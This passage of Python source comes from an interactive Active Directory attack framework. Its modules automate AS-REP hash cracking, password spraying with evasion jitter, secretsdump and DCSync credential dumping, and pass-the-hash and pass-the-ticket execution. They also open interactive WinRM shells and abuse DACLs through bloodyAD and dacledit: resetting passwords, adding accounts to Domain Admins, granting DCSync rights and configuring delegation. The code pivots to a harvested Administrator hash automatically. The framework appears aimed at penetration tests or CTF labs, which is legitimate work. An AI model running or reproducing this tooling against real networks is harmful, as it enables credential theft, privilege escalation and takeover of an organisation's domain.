                log(f'{len(hs)} AS-REP hash(es): {WHITE}{out}{RESET}','success'); add_result('asreproast', f'{len(hs)} AS-REP hash(es)')
                for h in hs: print(f'  {PINK}{h[:100]}{"..." if len(h)>100 else ""}{RESET}')
                hr()
                print(f'  {WHITE}hashcat -m 18200 {out} rockyou.txt{RESET}  {GREY}# RC4{RESET}')
                print(f'  {WHITE}hashcat -m 19900 {out} rockyou.txt{RESET}  {GREY}# AES256{RESET}')
                print(f'  {WHITE}john {out} --wordlist=rockyou.txt{RESET}     {GREY}# handles AES automatically{RESET}')
                # auto-crack with john if hashcat likely to fail (AES hashes)
                aes_hashes = [h for h in hs if '$krb5asrep$18$' in h or '$krb5asrep$17$' in h]
                if aes_hashes:
                    log(f'{ORANGE}AES hashes detected — john handles these better than hashcat{RESET}','warn')
                    john = check_tool('john')
                    if john:
                        wl = self.ask('crack now with john? wordlist','','skip')
                        if wl and wl != 'skip' and os.path.isfile(wl):
                            run_cmd([john,out,'--wordlist='+wl], label='john asreproast')
                            run_cmd([john,out,'--show'], label='john show cracked')
        hr()

class Spray(Module):
    name='spray'; description='netexec -- password spray SMB/WinRM/LDAP/SSH/MSSQL/FTP/RDP'; category='credentials'
    def run(self, target):
        if not target.dc: log('Set DC first','error'); return
        nxc = self.need('netexec','nxc','crackmapexec','cme')
        if not nxc: return
        hr()
        # probe ports first to suggest best protocol
        log(f'Probing ports on {WHITE}{target.dc}{RESET}...','info')
        best, available = best_protocol(target.dc)
        if available:
            log(f'Open protocols: {WHITE}{", ".join(available)}{RESET}','info')
        proto = self.ask('protocol', best or 'smb',
                         ['smb','winrm','ldap','ssh','mssql','ftp','rdp','kerberos'])
        _default_ul = os.path.join(target.loot_dir,'users.txt') if os.path.exists(os.path.join(target.loot_dir,'users.txt')) else ''
        users_in = self.ask('users (user,user2 or /path/users.txt)', _default_ul)
        pass_in  = self.ask('password or /path/pass.txt')
        if not users_in or not pass_in: log('Users and password required','error'); return
        jitter   = self.ask('jitter seconds between attempts (0 = none)','0')
        ua = ['-u', users_in] if os.path.isfile(users_in) else ['-u']+users_in.split(',')
        pa = ['-p', pass_in]  if os.path.isfile(pass_in)  else ['-p', pass_in]
        no_bruteforce = ['--no-bruteforce'] if os.path.isfile(users_in) and os.path.isfile(pass_in) else []
        jitter_secs = float(jitter) if jitter and float(jitter) > 0 else 0

        # kerberos spray via kerbrute
        if proto == 'kerberos':
            kerbrute = check_tool('kerbrute')
            if not kerbrute: log('kerbrute not found','error'); hr(); return
            pw = pass_in if not os.path.isfile(pass_in) else open(pass_in, errors='replace').read().strip().split('\n')[0]
            dc_host = target.dc_fqdn or target.dc
            cmd = [kerbrute,'passwordspray','--dc',dc_host,'-d',target.domain,
                   users_in if os.path.isfile(users_in) else '/dev/stdin', pw]
            run_cmd(cmd, label='kerbrute passwordspray')
            hr(); return

        cmd = [nxc,proto,target.dc]+ua+pa
        if target.domain: cmd += ['-d',target.domain]
        cmd += ['--continue-on-success'] + no_bruteforce
        hr(); hits = []
        import time as _t_spray, random as _rand_spray
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                    text=True, errors='replace')
            for line in proc.stdout:
                l = line.rstrip()
                if '[+]' in l or 'Pwn3d' in l:
                    print(f'  {GREEN}{l}{RESET}'); hits.append(l)
                    # save hit to DB
                    m = re.search(r'\\([^\\]+)\s', l)
                    if m:
                        u = m.group(1)
                        p = pass_in if not os.path.isfile(pass_in) else ''
                        ws = os.path.basename(target.loot_dir)
                        _db_save_cred(ws, target.domain, u, p, source='spray')
                elif '[-]' in l:
                    print(f'  {GREY}{l}{RESET}')
                    # jitter between attempts
                    if jitter_secs > 0:
                        _t_spray.sleep(_rand_spray.uniform(jitter_secs * 0.5, jitter_secs * 1.5))
                else:
                    print(f'  {WHITE}{l}{RESET}')
            proc.wait()
        except Exception as exc: log(f'{exc}','error'); return
        hr()
        if hits:
            log(f'{len(hits)} hit(s):','success')
            [print(f'  {GREEN}{h}{RESET}') for h in hits]
            add_result('spray', f'{len(hits)} hit(s): {hits[0][:40]}' + (f' +{len(hits)-1} more' if len(hits) > 1 else ''))
            # auto cred reuse for first hit
            try:
                first = hits[0]
                # parse user:pass from nxc output
                import re as _re_spray
                m = _re_spray.search(r'\\([^:]+):(.+?)(?:\s|$)', first)
                if m:
                    _auto_cred_reuse(target, m.group(1), new_pass=m.group(2))
            except Exception: pass
        else:
            log('No valid credentials','warn')
        hr()

# =============================================================================
# LATERAL MOVEMENT
# =============================================================================
class SecretsDump(Module):
    name='secretsdump'; description='impacket-secretsdump -- remote hash dump SAM/NTDS/LSA/cached creds'; category='lateral'
    def run(self, target):
        if not self.req(target): return
        t = self.need('impacket-secretsdump','secretsdump.py')
        if not t: return
        hr()
        t_host = self.ask('target',target.dc)
        out    = os.path.join(target.loot_dir,f'secretsdump_{t_host}.txt')
        auth, extra = target.imp_str(t_host)
        cmd = [t]+auth+extra+['-outputfile',out]
        run_cmd(cmd, label='secretsdump')
        for ext in ['.ntds','.sam','.secrets','']:
            f = (out+ext) if ext else out
            if os.path.exists(f) and os.path.getsize(f) > 0:
                lines = [l.rstrip() for l in open(f) if ':::' in l]
                if lines:
                    log(f'{len(lines)} hashes: {WHITE}{f}{RESET}','success')
                    for h in lines[:6]: print(f'  {PINK}{h}{RESET}')
                    if len(lines)>6: print(f'  {GREY}+{len(lines)-6} more{RESET}')
        hr()

class DCSync(Module):
    name='dcsync'; description='DCSync -- dump hashes via DRSUAPI (445) or LDAP channel (389/WinRM fallback)'; category='lateral'
    def run(self, target):
        if not self.req(target): return
        t = self.need('impacket-secretsdump','secretsdump.py')
        if not t: return
        hr()
        uf  = self.ask('specific user (blank = all)','')
        out = os.path.join(target.loot_dir,'dcsync.txt')

        # test if port 445 is reachable — if not, use -use-vss or LDAP channel
        import socket as _sock
        port445_open = False
        try:
            s = _sock.create_connection((target.dc, 445), timeout=3)
            s.close(); port445_open = True
        except Exception: pass

        auth, extra = target.imp_str()
        cmd = [t]+auth+extra+['-outputfile',out]

        if port445_open:
            log('Port 445 open — using DRSUAPI (standard DCSync)', 'info')
            cmd += ['-just-dc-ntlm']  # -just-dc causes DRSUAPI BAD_DN on some DCs
            if uf: cmd += ['-just-dc-user',uf]
        else:
            log(f'{ORANGE}Port 445 blocked — falling back to LDAP channel{RESET}', 'warn')
            log('Using secretsdump with -use-vss or -ldap-query mode...', 'info')
            # use -just-dc-ntlm over LDAP — works when SMB is blocked
            cmd += ['-just-dc-ntlm']
            if uf: cmd += ['-just-dc-user',uf]
            # also try netexec ldap as alternative
            nxc = check_tool('netexec','nxc')
            if nxc:
                log(f'Also trying netexec LDAP dump...', 'info')
                nxc_cmd = [nxc,'ldap',target.dc]+target.nxc_args()+['--ntds']
                run_cmd(nxc_cmd, label='netexec ldap --ntds')

        run_cmd(cmd, label='dcsync')
        ntds = out+'.ntds'
        if os.path.exists(ntds):
            lines = [l.rstrip() for l in open(ntds) if ':::' in l]
            log(f'{len(lines)} hashes → {WHITE}{ntds}{RESET}','success'); add_result('dcsync', f'{len(lines)} hashes')
            for h in lines[:8]: print(f'  {PINK}{h}{RESET}')
            if len(lines)>8: print(f'  {GREY}+{len(lines)-8} more{RESET}')
            hr()
            print(f'  {WHITE}hashcat -m 1000 {ntds} rockyou.txt{RESET}')
            # auto-pivot to administrator if found
            for line in lines:
                m = re.match(r'([^:]+)\\Administrator:500:([a-f0-9]{32}):([a-f0-9]{32}):::', line, re.I)
                if not m:
                    m = re.match(r'Administrator:500:([a-f0-9]{32}):([a-f0-9]{32}):::', line, re.I)
                    if m:
                        nt = m.group(2)
                    else:
                        continue
                else:
                    nt = m.group(3)
                if nt and nt != '31d6cfe0d16ae931b73c59d7e0c089c0':
                    log(f'{GREEN}Administrator hash found — auto-pivoting{RESET}','success')
                    target.user = 'Administrator'
                    target.hash = nt
                    target.password = None
                    if 'KRB5CCNAME' in os.environ: del os.environ['KRB5CCNAME']
                    log(f'Pivoted to {WHITE}Administrator{RESET} / hash:{WHITE}{nt}{RESET}','success')
                    log(f'Run: {C0}flag{RESET} to grab flags or {C0}exec{RESET} for a shell','info')
                    break
        hr()

class PassTheHash(Module):
    name='pth'; description='pass-the-hash -- wmiexec/smbexec/psexec/atexec exec via NT hash'; category='lateral'
    def run(self, target):
        if not target.dc: log('Set DC first','error'); return
        hr()
        method = self.ask('method','wmiexec',['wmiexec','smbexec','psexec','atexec','dcomexec'])
        t_host = self.ask('target',target.dc)
        # always ask for user+hash — may differ from current target context (e.g. after dcsync)
        u      = self.ask('username', target.user or '')
        h      = self.ask('NT hash', target.hash or '')
        d      = target.domain or self.ask('domain')
        cmd_r  = self.ask('command (blank = interactive)','whoami')
        if not h: log('NT hash required','error'); hr(); return
        if not u: log('Username required','error'); hr(); return
        tool   = self.need(f'impacket-{method}',f'{method}.py')
        if not tool: return
        cmd = [tool,f'{d}/{u}@{t_host}','-hashes',f':{h}','-no-pass']
        if cmd_r: cmd.append(cmd_r)
        run_cmd(cmd, label=f'PTH {method}')
        hr()

class PassTheTicket(Module):
    name='ptt'; description='pass-the-ticket -- getTGT then exec with ccache / inject Kerberos ticket'; category='lateral'
    def run(self, target):
        if not self.req(target): return
        hr()
        action = self.ask('action','gettgt',['gettgt','exec'])
        if action == 'gettgt':
            t = self.need('impacket-getTGT','getTGT.py')
            if not t: return
            out = os.path.join(target.loot_dir,f'{target.user}.ccache')
            if not target.user: log('Username required','error'); hr(); return
            cmd = [t,f'{target.domain}/{target.user}','-dc-ip',target.dc]
            if target.hash:       cmd += ['-hashes',f':{target.hash}']
            elif target.password: cmd += ['-p',target.password]
            rc = run_cmd(cmd+['-o',out], label='getTGT')
            cwd_ccache = os.path.join(os.getcwd(), f'{target.user}.ccache')
            if os.path.exists(out) or os.path.exists(cwd_ccache):
                log(f'TGT saved → {WHITE}{out}{RESET}','success')
                src = out if os.path.exists(out) else cwd_ccache
                if src != out:
                    import shutil as _sh_tgt; _sh_tgt.copy(src, out)
                os.environ['KRB5CCNAME'] = out
                add_result('tgt', f'{target.user} ccache')
            log(f'Export: {WHITE}export KRB5CCNAME={out}{RESET}','info')
        else:
            ccache = self.ask('ccache file'); t_host = self.ask('target',target.dc)
            method = self.ask('method','wmiexec',['wmiexec','smbexec','psexec'])
            tool   = self.need(f'impacket-{method}',f'{method}.py')
            if not tool: return
            env = os.environ.copy(); env['KRB5CCNAME'] = ccache
            run_cmd([tool,'-k','-no-pass',f'{target.domain}/{target.user}@{t_host}'], label=f'PTT {method}', env=env)
        hr()

class NXCExec(Module):
    name='exec'; description='evil-winrm / netexec -- interactive WinRM shell or SMB/SSH command exec'; category='lateral'
    def run(self, target):
        if not target.dc: log('Set DC first','error'); return
        hr()
        proto  = self.ask('protocol','winrm',['winrm','smb','ssh'])
        t_host = self.ask('target',target.dc)
        hr()
        if proto == 'winrm':
            ewrm = check_tool('evil-winrm')
            if ewrm:
                ccache = os.environ.get('KRB5CCNAME','')
                use_krb = ccache and os.path.exists(ccache)
                if use_krb:
                    # Kerberos auth — requires -r REALM and FQDN
                    realm = target.domain.upper()
                    if t_host == target.dc and target.dc_fqdn:
                        t_host = target.dc_fqdn
                    cmd = [ewrm,'-i',t_host,'-r',realm]
                    log(f'{GREEN}evil-winrm — Kerberos auth (realm: {WHITE}{realm}{RESET}{GREEN}){RESET}','success')
                    log(f'{GREY}KRB5CCNAME: {ccache}{RESET}','info')
                    _exec_auth_args = [f'{target.domain}/{target.user}@{target.dc_fqdn or target.dc}','-k','-no-pass']
                elif target.hash:
                    cmd = [ewrm,'-i',t_host,'-u',target.user,'-H',target.hash]
                    log(f'{GREEN}evil-winrm — PTH{RESET}','success')
                    _exec_auth_args = [f'{target.domain}/{target.user}@{target.dc_fqdn or target.dc}','-hashes',f':{target.hash}','-no-pass']
                elif target.password:
                    cmd = [ewrm,'-i',t_host,'-u',target.user,'-p',target.password]
                    log(f'{GREEN}evil-winrm — password auth{RESET}','success')
                    _exec_auth_args = None
                else:
                    cmd = [ewrm,'-i',t_host,'-u',target.user,'-N']
                    log(f'{GREEN}evil-winrm — no auth{RESET}','success')
                    _exec_auth_args = None

                # quick pre-check via wmiexec to get hostname+whoami for attack map
                _wmi_pre = check_tool('impacket-wmiexec','wmiexec.py')
                _exec_node = f'shell — {target.user}@{t_host}'
                if _wmi_pre and _exec_auth_args:
                    try:
                        _who = subprocess.check_output(
                            [_wmi_pre] + _exec_auth_args + ['whoami /fqdn'],
                            stderr=subprocess.DEVNULL, text=True, timeout=8, errors='replace').strip()
                        _hn = subprocess.check_output(
                            [_wmi_pre] + _exec_auth_args + ['hostname'],
                            stderr=subprocess.DEVNULL, text=True, timeout=8, errors='replace').strip()
                        # parse just the useful parts
                        _who_short = _who.split('\\')[-1].split('\n')[0].strip() if _who else target.user
                        _hn_short = _hn.split('\n')[0].strip() if _hn else t_host
                        if _who_short and _hn_short:
                            _exec_node = f'{_who_short}@{_hn_short}'
                            log(f'{GREEN}whoami: {WHITE}{_who_short}{RESET}  hostname: {WHITE}{_hn_short}{RESET}','success')
                    except Exception:
                        pass
                add_result('exec', _exec_node)
                log(f'{GREY}Tips: upload/download, menu, Bypass-4MSI, services{RESET}','info')
                log(f'{GREY}      b64get <remote_path> — exfil files via base64 (bypasses evil-winrm download bug){RESET}','info')

                # auto-screenshot: save whoami/all + hostname + privs to loot
                try:
                    _ss_file = os.path.join(target.loot_dir, f'shell_{_exec_node.replace("@","_").replace("\\\\","_")}.txt')
                    _ss_cmds = ['whoami /all', 'hostname', 'ipconfig /all',
                                'net localgroup administrators', 'systeminfo | findstr /i "os name build"']
                    _ss_proc = subprocess.run(
                        cmd[:-0] if cmd else cmd,  # dry run to check
                        capture_output=True, text=True, timeout=2)
                    # write command log
                    with open(_ss_file,'w') as _sf:
                        _sf.write(f'# Shell opened: {_exec_node}\n')
                        _sf.write(f'# Time: {datetime.now().isoformat()}\n')
                        _sf.write(f'# Commands to run:\n')
                        for c in _ss_cmds:
                            _sf.write(f'{c}\n')
                    log(f'{GREY}Shell log → {WHITE}{_ss_file}{RESET}','info')
                    log(f'{GREY}Suggested: whoami /all · net localgroup administrators · systeminfo{RESET}','info')
                except Exception:
                    pass

                log(f'{GREY}{" ".join(cmd)}{RESET}','info'); hr()
                # fork before exec — prevents Ruby/Python memory conflict
                pid = os.fork()
                if pid == 0:
                    # child: exec evil-winrm (replaces this process)
                    os.execvp(cmd[0], cmd)
                else:
                    # parent: wait for evil-winrm to finish
                    os.waitpid(pid, 0)
            else:
                # fallback to netexec for command exec
                nxc = self.need('netexec','nxc','crackmapexec','cme')
                if not nxc: return
                log(f'{ORANGE}evil-winrm not found — falling back to netexec (no interactive shell){RESET}','warn')
                log(f'Install: {WHITE}sudo apt install evil-winrm -y{RESET}','info')
                cmd_run = self.ask('command','whoami /all')
                run_cmd([nxc,'winrm',t_host]+target.nxc_args(t_host)+['-x',cmd_run], label='netexec winrm')
        elif proto == 'smb':
            nxc = self.need('netexec','nxc','crackmapexec','cme')
            if not nxc: return
            cmd_run = self.ask('command','whoami /all')
            meth    = self.ask('exec method','wmiexec',['wmiexec','smbexec','mmcexec','atexec'])
            run_cmd([nxc,'smb',t_host]+target.nxc_args(t_host)+['-x',cmd_run,'--exec-method',meth], label=f'exec smb {meth}')
        elif proto == 'ssh':
            nxc = self.need('netexec','nxc','crackmapexec','cme')
            if not nxc: return
            cmd_run = self.ask('command','whoami')
            run_cmd([nxc,'ssh',t_host]+target.nxc_args(t_host)+['-x',cmd_run], label='exec ssh')
        hr()

class BloodyAttack(Module):
    name='bloody'; description='bloodyAD -- DACL abuse: reset pwd, add user, group add, RBCD, preauth, GenericAll'; category='lateral'
    def run(self, target):
        if not self.req(target): return
        t = self.need('bloodyad','bloodyAD')
        if not t: return
        hr()
        # auto-answer from pathpwn hints if available
        _hints = _PATHPWN_HINTS
        _default_action = _hints.get('action','resetpwd')
        action = self.ask('action', _default_action,
            ['resetpwd','adduser','addtogroup','addself','removefromgroup','writeowner','genericall',
             'dcsync-rights',
             'setrbcd','setdontreqpreauth','setpassnotreqd','getattr','setattr','addspn','removespn','setdelegation',
             'enableaccount','disableaccount'])
        base = [t]+target.bloodyad_args(); hr()

        def _resolve(name):
            """Auto-convert names with spaces to full DN."""
            if name and ' ' in name and not name.startswith('CN='):
                dc_path = 'DC=' + ',DC='.join(target.domain.split('.'))
                dn = f'CN={name},CN=Users,{dc_path}'
                log(f'Resolving to DN: {WHITE}{dn}{RESET}','info')
                return dn
            return name
        if action == 'resetpwd':
            tu = self.ask('target user', _hints.get('user',''))
            np = self.ask('new password','Passw0rd123!')
            def _bloody_resetpwd(b_cmd, label):
                """Run bloodyAD resetpwd — global run_cmd filter handles traceback suppression."""
                return run_cmd(b_cmd, label=label)
            rc = _bloody_resetpwd(base+['set','password',_resolve(tu),np], 'bloodyAD resetpwd')
            if rc == 0:
                add_result('bloody', f'{tu} pwd reset')
                track_cleanup('password_reset', f'{tu} password changed to {np}',
                    lambda _u=tu, _p=np: log(
                        f'{ORANGE}Cleanup: {WHITE}{_u}{ORANGE} password was set to {WHITE}{_p}{ORANGE} — reset manually if needed{RESET}','warn'))
            if rc != 0:
                # check if it's a password age policy issue — retry with Kerberos
                # get fresh TGT so group membership is reflected in PAC
                getTGT = check_tool('impacket-getTGT','getTGT.py')
                if getTGT and target.password:
                    log(f'{ORANGE}Retrying with Kerberos auth (fresh TGT) to bypass password age policy{RESET}','warn')
                    orig_cwd = os.getcwd()
                    os.makedirs(target.loot_dir, exist_ok=True)
                    os.chdir(target.loot_dir)
                    run_cmd([getTGT, f'{target.domain}/{target.user}:{target.password}',
                             '-dc-ip', target.dc], label='getTGT for resetpwd')
                    os.chdir(orig_cwd)
                    new_ccache = os.path.join(target.loot_dir, f'{target.user}.ccache')
                    if os.path.exists(new_ccache):
                        os.environ['KRB5CCNAME'] = new_ccache
                        bloody = check_tool('bloodyad','bloodyAD')
                        krb_base = [bloody]+target.bloodyad_args()  # uses FQDN+--dc-ip automatically
                        rc2 = _bloody_resetpwd(krb_base+['set','password',_resolve(tu),np], 'bloodyAD resetpwd (Kerberos)')
                        if rc2 == 0:
                            log(f'{GREEN}Password reset via Kerberos — group membership applied{RESET}','success')
                            hr(); return
                # final fallback: net rpc password
                log(f'{ORANGE}Trying net rpc password reset{RESET}','warn')
                netrpc = check_tool('net')
                if netrpc:
                    run_cmd([netrpc,'rpc','password',tu,np,
                             '-U',f'{target.domain}/{target.user}%{target.password}',
                             '-S',target.dc],
                            label='net rpc password reset')
                else:
                    log('net not found — try: sudo apt install samba-common-bin','error')
        elif action == 'adduser':
            nu = self.ask('new username'); np = self.ask('password','Passw0rd123!')
            rc = run_cmd(base+['add','user',nu,np], label='bloodyAD adduser')
            if rc == 0:
                track_cleanup('user_created', f'user {nu} created',
                    lambda _u=nu: (
                        log(f'Cleanup: deleting user {WHITE}{_u}{RESET}','info'),
                        run_cmd(base+['remove','object',_u], label='bloodyAD cleanup remove user')
                    ))
        elif action == 'dcsync-rights':
            log('Full DCSync rights chain — addtogroup Exchange Windows Permissions + dacledit','info')
            principal = self.ask('principal to grant DCSync', target.user)
            target_dn = 'DC=' + ',DC='.join(target.domain.split('.'))
            dacledit  = check_tool('dacledit.py') or check_tool('impacket-dacledit')  # prefer .py over shell wrapper

            # step 1 — add to Exchange Windows Permissions for WriteDACL
            log('Step 1: adding to Exchange Windows Permissions...','info')
            rc1 = run_cmd(base+['add','groupMember','Exchange Windows Permissions', principal],
                          label='addtogroup Exchange Windows Permissions')
            if rc1 != 0:
                log(f'{ORANGE}addtogroup failed — may already be member, continuing...{RESET}','warn')

            # step 2 — grant DCSync via dacledit
            log('Step 2: granting DCSync via dacledit...','info')
            if dacledit:
                # dacledit auth format: domain/user:pass (no @host)
                if target.hash:
                    dacl_auth = [f'{target.domain}/{target.user}', '-hashes', f':{target.hash}']
                else:
                    dacl_auth = [f'{target.domain}/{target.user}:{target.password}']
                cmd_prefix = ['python3', dacledit] if dacledit.endswith('.py') else [dacledit]
                dc_cmd = cmd_prefix + ['-action','write','-rights','DCSync',
                          '-principal', principal,
                          '-target-dn', target_dn,
                          '-dc-ip', target.dc] + dacl_auth
                rc2 = run_cmd(dc_cmd, label='dacledit grant DCSync')
                if rc2 == 0:
                    log(f'{GREEN}DCSync rights granted to {WHITE}{principal}{RESET} — run dcsync','success')
                    add_result('bloody', f'DCSync rights → {principal}')
                    track_cleanup('dacl', f'DCSync rights on {target_dn}',
                        lambda: log(f'{ORANGE}Cleanup: remove DCSync rights manually via dacledit -action remove{RESET}','warn'))
                else:
                    log(f'{RED}dacledit failed — try manually:{RESET}','error')
                    log(f'  python3 {dacledit} -action write -rights DCSync -principal {principal} -target-dn "{target_dn}" -dc-ip {target.dc} "{target.domain}/{target.user}:{target.password}"','info')
            else:
                log(f'{RED}dacledit.py not found{RESET}','error')
                log(f'Expected at: /usr/share/doc/python3-impacket/examples/dacledit.py','info')

        elif action == 'addtogroup':
            tu = self.ask('user', _hints.get('user', target.user or ''))
            tg = self.ask('group', _hints.get('group','Domain Admins'))
            rc = run_cmd(base+['add','groupMember',tg,_resolve(tu)], label='bloodyAD addtogroup')
            if rc == 0:
                add_result('bloody', f'{tu} → {tg}')
                track_cleanup('group_member', f'{tu} added to {tg}',
                    lambda _u=tu, _g=tg: (
                        log(f'Cleanup: removing {WHITE}{_u}{RESET} from {WHITE}{_g}{RESET}','info'),
                        run_cmd(base+['remove','groupMember',_g,_resolve(_u)], label='bloodyAD cleanup remove member')
                    ))
        elif action == 'addself':
            tg = self.ask('group to add yourself to')
            rc = run_cmd(base+['add','groupMember',tg,target.user], label='bloodyAD addself')
            if rc == 0:
                add_result('bloody', f'{target.user} → {tg}')
                track_cleanup('group_member', f'{target.user} added to {tg}',
                    lambda _u=target.user, _g=tg: (
                        log(f'Cleanup: removing {WHITE}{_u}{RESET} from {WHITE}{_g}{RESET}','info'),
                        run_cmd(base+['remove','groupMember',_g,_u], label='bloodyAD cleanup remove self')
                    ))
            # get fresh TGT so new group membership is reflected in PAC for next operations
            getTGT = check_tool('impacket-getTGT','getTGT.py')
            if getTGT and target.password:
                log(f'Getting fresh TGT to reflect new {tg} membership...','info')
                orig_cwd = os.getcwd()
                os.chdir(target.loot_dir)
                run_cmd([getTGT, f'{target.domain}/{target.user}:{target.password}',
                         '-dc-ip', target.dc], label='getTGT (post-addself)')
                os.chdir(orig_cwd)
                new_cc = os.path.join(target.loot_dir, f'{target.user}.ccache')
                if os.path.exists(new_cc):
                    os.environ['KRB5CCNAME'] = new_cc
                    log(f'{GREEN}TGT refreshed — {tg} membership active{RESET}','success')
        elif action == 'removefromgroup':
            tu = self.ask('member to remove'); tg = self.ask('from group')
            run_cmd(base+['remove','groupMember',_resolve(tg),_resolve(tu)], label='bloodyAD removefromgroup')
        elif action == 'setdelegation':
            tu = self.ask('target computer account (e.g. FS01$)')
            spns = self.ask('SPNs to delegate to (comma separated)', f'cifs/dc.{target.domain},cifs/DC')
            spn_list = [s.strip() for s in spns.split(',')]
            # set TrustedToAuthForDelegation flag
            log(f'Setting TrustedToAuthForDelegation on {WHITE}{tu}{RESET}','info')
            run_cmd(base+['add','uac',_resolve(tu),'-f','TRUSTED_TO_AUTH_FOR_DELEGATION'],
                label='bloodyAD add uac TRUSTED_TO_AUTH_FOR_DELEGATION')
            # set msDS-AllowedToDelegateTo
            for spn in spn_list:
                log(f'Adding delegate SPN: {WHITE}{spn}{RESET}','info')
                run_cmd(base+['set','object',_resolve(tu),'msDS-AllowedToDelegateTo','-v',spn],
                    label=f'bloodyAD set msDS-AllowedToDelegateTo {spn}')
            # verify
            log('Verifying...','info')
            run_cmd(base+['get','object',_resolve(tu),'--attr','msDS-AllowedToDelegateTo'],
                label='bloodyAD verify delegation')
        elif action == 'setrbcd':
            comp = self.ask('controlled computer sAMAccountName'); tcomp = self.ask('target computer')
            run_cmd(base+['set','rbcd',tcomp,comp], label='bloodyAD setrbcd')
        elif action == 'setdontreqpreauth':
            tu = self.ask('target user')
            run_cmd(base+['add','uac',tu,'-f','DONT_REQ_PREAUTH'], label='bloodyAD preauth')
            log('Now run: asreproast','info')
        elif action == 'setpassnotreqd':
            tu = self.ask('target user')
            run_cmd(base+['add','uac',tu,'-f','PASSWD_NOTREQD'], label='bloodyAD passnotreqd')
        elif action == 'enableaccount':
            tu = self.ask('target user')
            rc = run_cmd(base+['remove','uac',tu,'-f','ACCOUNTDISABLE'], label='bloodyAD enable')
            if rc == 0:
                log(f'{GREEN}{tu} enabled{RESET}','success')
                add_result('bloody', f'{tu} enabled')
        elif action == 'disableaccount':
            tu = self.ask('target user')
            rc = run_cmd(base+['add','uac',tu,'-f','ACCOUNTDISABLE'], label='bloodyAD disable')
            if rc == 0:
                log(f'{GREEN}{tu} disabled{RESET}','success')
        elif action == 'getattr':
            obj = self.ask('object (user/computer)'); attr = self.ask('attribute','description')
            run_cmd(base+['get','object',obj,'--attr',attr], label='bloodyAD getattr')
        elif action == 'setattr':
            obj = self.ask('object'); attr = self.ask('attribute'); val = self.ask('value')
            # bloodyAD set object syntax: set object <target> <attribute> -v <value>
            # for objects with spaces, try CN= DN format
            obj_r = _resolve(obj)
            run_cmd(base+['set','object',obj_r,attr,'-v',val], label='bloodyAD setattr')
        elif action == 'addspn':
            tu = self.ask('target user'); spn = self.ask('SPN (e.g. http/evilhost)')
            run_cmd(base+['add','spn',tu,spn], label='bloodyAD addspn')
        elif action == 'removespn':
            tu = self.ask('target user'); spn = self.ask('SPN to remove')
            run_cmd(base+['remove','spn',tu,spn], label='bloodyAD removespn')
        elif action == 'writeowner':
            log(f'WriteOwner — take ownership then grant FullControl via owneredit + dacledit','info')
            obj       = self.ask('target object (group/user/computer)')
            new_owner = self.ask('new owner (your user)', target.user or '')
            if not obj:
                log('Target object required','error'); hr(); return

            owneredit = check_tool('impacket-owneredit','owneredit.py')
            dacledit2 = check_tool('dacledit.py','impacket-dacledit')
            getTGT    = check_tool('impacket-getTGT','getTGT.py')

            if not owneredit or not dacledit2:
                log(f'{RED}impacket-owneredit or impacket-dacledit not found{RESET}','error')
                hr(); return

            # get fresh TGT with current group membership then use Kerberos auth
            ccache = os.path.join(target.loot_dir, f'{target.user}_writeowner.ccache')
            use_krb = False
            if getTGT and target.password:
                import shutil as _sh2
                # getTGT saves to <username>.ccache in cwd — set cwd to loot dir
                orig_cwd = os.getcwd()
                os.makedirs(target.loot_dir, exist_ok=True)
                os.chdir(target.loot_dir)
                rc_tgt = run_cmd([getTGT, f'{target.domain}/{target.user}:{target.password}',
                                  '-dc-ip', target.dc],
                                 label='getTGT fresh ticket')
                os.chdir(orig_cwd)
                cwd_ccache = os.path.join(target.loot_dir, f'{target.user}.ccache')
                if rc_tgt == 0 and os.path.exists(cwd_ccache):
                    os.environ['KRB5CCNAME'] = cwd_ccache
                    ccache = cwd_ccache
                    use_krb = True
                    log(f'{GREEN}Using Kerberos auth with fresh TGT → {WHITE}{ccache}{RESET}','success')
                else:
                    log(f'{ORANGE}TGT failed — falling back to password auth{RESET}','warn')

            # cross-domain: target DC may differ from current DC
            xdomain = '.' in obj and target.domain.lower() not in obj.lower()
            target_dc_ip = target.dc
            if xdomain:
                log(f'{ORANGE}Cross-domain target detected — specify target DC{RESET}','warn')
                target_dc_ip = self.ask('target domain DC IP', target.dc)

            if use_krb:
                krb_target = f'{target.domain}/{target.user}@{target.dc_fqdn or target.dc}'
                oe_cmd  = [owneredit,'-action','write','-new-owner',new_owner,
                           '-target',obj,'-k','-no-pass',krb_target,'-dc-ip',target_dc_ip]
                dcl_cmd = [dacledit2,'-action','write','-rights','FullControl',
                           '-principal',new_owner,'-target',obj,'-k','-no-pass',
                           krb_target,'-dc-ip',target_dc_ip]
                if xdomain:
                    oe_cmd  += ['-use-ldaps']
                    dcl_cmd += ['-use-ldaps']
            else:
                auth_full = f'{target.domain}/{target.user}:{target.password}' if target.password else f'{target.domain}/{target.user}'
                oe_cmd  = [owneredit,'-action','write','-new-owner',new_owner,
                           '-target',obj,auth_full,'-dc-ip',target_dc_ip]
                dcl_cmd = [dacledit2,'-action','write','-rights','FullControl',
                           '-principal',new_owner,'-target',obj,auth_full,'-dc-ip',target_dc_ip]

            rc1 = run_cmd(oe_cmd, label='owneredit take ownership')
            rc2 = run_cmd(dcl_cmd, label='dacledit grant FullControl')

            if rc1 == 0 and rc2 == 0:
                log(f'{GREEN}FullControl granted on {WHITE}{obj}{GREEN} to {WHITE}{new_owner}{RESET}','success')
                add_result('bloody', f'FullControl on {obj}')
                track_cleanup('dacl', f'FullControl granted on {obj} to {new_owner}',
                    lambda _obj=obj, _owner=new_owner: (
                        log(f'Cleanup: revoking FullControl on {WHITE}{_obj}{RESET} from {WHITE}{_owner}{RESET}','info'),
                        run_cmd([dacledit2,'-action','remove','-rights','FullControl',
                                 '-principal',_owner,'-target',_obj,
                                 f'{target.domain}/{target.user}:{target.password}' if target.password else f'{target.domain}/{target.user}',
                                 '-dc-ip',target.dc], label='dacledit cleanup')
                    ))
                # invalidate ccache so next op gets fresh TGT with updated group membership
                if 'KRB5CCNAME' in os.environ:
                    old_cc = os.environ.pop('KRB5CCNAME')
                    try: os.remove(old_cc)
                    except Exception: pass
                    log(f'{GREY}ccache cleared — next Kerberos op will get fresh TGT with new group membership{RESET}','info')
            else:
                log(f'dacledit failed — check permissions','error')
        elif action == 'genericall':
            obj  = self.ask('target object')
            user = self.ask('user to grant GenericAll to', target.user or '')
            auth_full = f'{target.domain}/{target.user}:{target.password}' if target.password else f'{target.domain}/{target.user}'
            dacledit2 = check_tool('dacledit.py','impacket-dacledit')
            # try dacledit first — more reliable than bloodyAD for DACL writes
